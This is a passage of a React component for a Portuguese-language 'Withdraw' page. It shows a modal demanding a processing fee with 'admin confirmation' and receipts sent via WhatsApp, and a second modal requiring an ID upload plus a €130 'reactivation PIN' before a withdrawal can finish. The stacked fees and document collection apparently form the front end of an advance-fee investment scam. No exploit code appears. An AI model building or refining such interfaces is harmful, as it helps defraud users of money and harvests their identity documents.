                {PROCESSING_FEE_PAID ? (
                  <><FaCheckCircle /> Já Paguei — Prosseguir</>
                ) : (
                  <><FaLock /> Aguardando Confirmação do Admin</>
                )}
              </button>

              <a
                href={whatsappFeeLink}
                target="_blank"
                rel="noopener noreferrer"
                className="w-full py-3 rounded-lg bg-gradient-to-r from-green-600 to-emerald-600 text-white font-semibold hover:opacity-90 transition flex items-center justify-center gap-2"
              >
                <FaWhatsapp className="text-lg" /> Notificar Suporte / Enviar Comprovante
              </a>

              <button
                type="button"
                onClick={handleCancelFeeStep}
                className="w-full py-3 rounded-lg border border-slate-700 text-slate-300 font-medium hover:bg-slate-700/50 transition"
              >
                Cancelar Saque
              </button>
            </div>

            <div className="mt-4 flex items-center justify-center gap-2 text-xs text-slate-500">
              <FaComments className="text-slate-500" />
              <span>Suporte disponível 24/7 — resposta em minutos</span>
            </div>
          </div>
        </div>
      )}

      {/* ═══════════ MODAL DE REATIVAÇÃO ═══════════ */}
      {showReactivationModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/70 backdrop-blur-sm p-4">
          <div className="bg-slate-800 border border-slate-700 rounded-2xl p-6 w-full max-w-md max-h-[90vh] overflow-y-auto">
            <div className="flex justify-center mb-4">
              <div className="w-16 h-16 bg-yellow-500/10 border border-yellow-500/30 rounded-full flex items-center justify-center">
                <FaShieldAlt className="w-8 h-8 text-yellow-500" />
              </div>
            </div>
            <h3 className="text-xl font-bold text-white text-center mb-2">
              Reativação de Conta Necessária
            </h3>
            <div className="mb-4 p-3 bg-orange-500/10 border border-orange-500/30 rounded-lg flex items-start gap-3">
              <FaInfoCircle className="text-orange-400 text-sm mt-0.5 flex-shrink-0" />
              <p className="text-orange-300 text-xs leading-relaxed">
                Por segurança, envie seu documento de identidade e insira seu PIN de reativação. Um PIN de reativação custa{' '}
                <strong className="text-orange-200">€130,00</strong> e deve ser adquirido antes de concluir este saque.
              </p>
            </div>

            <div className="mb-4">
              <label className="block text-slate-300 text-sm font-medium mb-2">Enviar Documento de Identidade</label>
              {!idCardFile ? (
                <label
                  htmlFor="idCardInput"
                  className="flex flex-col items-center justify-center w-full h-24 border-2 border-dashed border-slate-600 rounded-lg cursor-pointer hover:border-blue-500 transition"
                >
                  <FaUpload className="w-5 h-5 text-slate-500 mb-1" />
                  <span className="text-xs text-slate-400">Clique para enviar (JPG, PNG, PDF – máx 5MB)</span>
                  <input
                    id="idCardInput"
                    ref={idInputRef}
                    type="file"
                    accept="image/*,.pdf"
                    onChange={handleIdFileChange}
                    className="hidden"
                  />
                </label>
              ) : (
                <div className="flex items-center justify-between p-3 bg-slate-900 border border-slate-700 rounded-lg">
                  <div className="flex items-center gap-2 min-w-0">
                    <FaIdCard className="w-5 h-5 text-green-500 flex-shrink-0" />
                    <span className="text-sm text-slate-300 truncate">{idCardFile.name}</span>
                  </div>
                  <button
                    type="button"
                    onClick={handleRemoveIdFile}
                    className="p-1 hover:bg-slate-700 rounded transition flex-shrink-0"
                  >
                    <FaTimes className="w-4 h-4 text-slate-400" />
                  </button>
                </div>
              )}
              {idError && <p className="text-red-400 text-xs mt-2">{idError}</p>}
            </div>

            <div className="mb-4">
              <label className="block text-slate-300 text-sm font-medium mb-2">PIN de Reativação</label>
              <div className="relative">
                <FaKey className="absolute left-3 top-1/2 transform -translate-y-1/2 text-slate-500" />
                <input
                  type="password"
                  value={reactivationPin}
                  onChange={(e) => setReactivationPin(e.target.value)}
                  placeholder="Digite o PIN"
                  maxLength="6"
                  className={`w-full bg-slate-900 border ${
                    pinError ? 'border-red-500' : 'border-slate-700'
                  } rounded-lg pl-10 pr-4 py-3 text-white placeholder-slate-500 focus:outline-none focus:border-blue-500 transition`}
                />
              </div>
              {pinError && <p className="text-red-400 text-xs mt-2">{pinError}</p>}
            </div>

            <div className="flex gap-3">
              <button
                onClick={() => setShowReactivationModal(false)}
                className="flex-1 py-3 rounded-lg border border-slate-700 text-slate-300 font-medium hover:bg-slate-700/50 transition"
              >
                Cancelar
              </button>
              <button
                onClick={handleVerifyPin}
                disabled={isVerifyingPin}
                className="flex-1 py-3 rounded-lg bg-gradient-to-r from-yellow-600 to-orange-600 text-white font-semibold hover:opacity-90 transition disabled:opacity-50 flex items-center justify-center gap-2"
              >
                {isVerifyingPin ? (
                  <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
                ) : (
                  'Reativar'
                )}
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default Withdraw;